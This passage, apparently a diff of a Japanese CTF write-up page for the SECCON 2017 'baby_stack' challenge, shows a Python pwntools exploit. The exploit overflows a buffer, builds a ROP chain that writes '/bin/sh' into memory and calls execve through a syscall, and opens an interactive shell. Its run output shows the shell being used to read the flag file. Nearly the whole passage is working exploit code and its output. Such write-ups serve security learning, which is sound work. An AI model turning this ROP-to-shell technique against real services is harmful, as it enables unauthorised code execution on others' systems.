+   <span style="color:#75715e">## 0x0000000000470931: pop rdi; or byte ptr [rax + 0x39], cl; ret;</span>
+   pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000470931</span>
+
+   <span style="color:#75715e">## 0x0000000000456499: mov qword ptr [rdi], rax; ret;</span>
+   mov_rdi_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000456499</span>
+
+   <span style="color:#75715e">## 0x000000000046defd: pop rsi; ret;</span>
+   pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000046defd</span>
+
+   <span style="color:#75715e">## 0x00000000004016ea: pop rax; ret;</span>
+   pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004016ea</span>
+
+   <span style="color:#75715e">## 0x0000000000448145: pop rdx; setbe byte ptr [rsp + 0x50]; add rsp, 0x38; ret;</span>
+   pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000448145</span>
+
+   <span style="color:#75715e">## static string</span>
+   please_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x521f00</span>
+   please_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6</span>
+
+   <span style="color:#75715e"># Input name (First input)</span>
+   buf1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hoge&#34;</span>
+   conn<span style="color:#f92672">.</span>sendline(buf1)
+
+   <span style="color:#75715e"># Input msg (Second input)</span>
+   <span style="color:#75715e">## name string</span>
+   buf2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x68</span>
+   buf2 <span style="color:#f92672">+=</span> p64(please_ptr)
+   buf2 <span style="color:#f92672">+=</span> p64(please_size)
+
+   <span style="color:#75715e">## msg string</span>
+   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0xc8</span><span style="color:#f92672">-</span>len(buf2))
+   buf2 <span style="color:#f92672">+=</span> p64(please_ptr)
+   buf2 <span style="color:#f92672">+=</span> p64(please_size)
+   buf2 <span style="color:#f92672">+=</span> p64(please_size)
+
+   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x198</span><span style="color:#f92672">-</span>len(buf2))
+
+   <span style="color:#75715e"># ROP</span>
+   <span style="color:#75715e">## rdx = 0</span>
+   buf2 <span style="color:#f92672">+=</span> p64(pop_rdx)
+   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
+   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x38</span>    <span style="color:#75715e"># add rsp, 0x38</span>
+
+   <span style="color:#75715e">## rsi = 0</span>
+   buf2 <span style="color:#f92672">+=</span> p64(pop_rsi)
+   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
+
+   <span style="color:#75715e">## rdi = &#34;/bin/sh&#34;</span>
+   buf2 <span style="color:#f92672">+=</span> p64(pop_rax)
+   buf2 <span style="color:#f92672">+=</span> p64(bss_addr) <span style="color:#75715e"># initialize rax with bss_addr</span>
+   buf2 <span style="color:#f92672">+=</span> p64(pop_rdi)
+   buf2 <span style="color:#f92672">+=</span> p64(bss_addr)
+   buf2 <span style="color:#f92672">+=</span> p64(pop_rax)
+   buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+   buf2 <span style="color:#f92672">+=</span> p64(mov_rdi_rax)
+
+   <span style="color:#75715e">## rax = 59</span>
+   buf2 <span style="color:#f92672">+=</span> p64(pop_rax)
+   buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">59</span>)      <span style="color:#75715e"># execve</span>
+
+   <span style="color:#75715e">## execve(&#34;/bin/sh&#34;, 0, 0)</span>
+   buf2 <span style="color:#f92672">+=</span> p64(syscall)
+   conn<span style="color:#f92672">.</span>sendline(buf2)
+   conn<span style="color:#f92672">.</span>interactive()</code></pre></div>
 </div>
-</div>
-</div>
-<div id="outline-container-headline-14" class="outline-4">
 <h4 id="headline-14">
 実行結果
 </h4>
-<div id="outline-text-headline-14" class="outline-text-4">
 <pre class="example">
 mc4nf@mc4nf:~/ctf/secconctf_2017/pwn/baby_stack$ python solve.py
-[*] &#39;/home/mc4nf/ctf/secconctf_2017/pwn/baby_stack/baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8&#39;
+[*] '/home/mc4nf/ctf/secconctf_2017/pwn/baby_stack/baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'
  Arch:     amd64-64-little
  RELRO:    No RELRO
  Stack:    No canary found
@@ -711,23 +749,17 @@ mc4nf@mc4nf:~/ctf/secconctf_2017/pwn/baby_stack$ python solve.py
  PIE:      No PIE (0x400000)
 [+] Opening connection to localhost on port 8000: Done
 [*] Switching to interactive mode
-Please tell me your name &gt;&gt; Give me your message &gt;&gt; Thank you, Please!
+Please tell me your name >> Give me your message >> Thank you, Please!
 msg : Please
 $ ls
 baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8
 flag.txt
 $ cat flag.txt
-SECCON{&#39;un54f3&#39;m0dul3_15_fr13ndly_70_4774ck3r5}
+SECCON{'un54f3'm0dul3_15_fr13ndly_70_4774ck3r5}
 </pre>
-<div id="outline-container-headline-15" class="outline-5">
 <h5 id="headline-15">
 <code>SECCON{&#39;un54f3&#39;m0dul3_15_fr13ndly_70_4774ck3r5}</code>
 </h5>
-</div>
-</div>
-</div>
-</div>
-</div>
 
     </div>
     <footer class="content__footer"></footer>
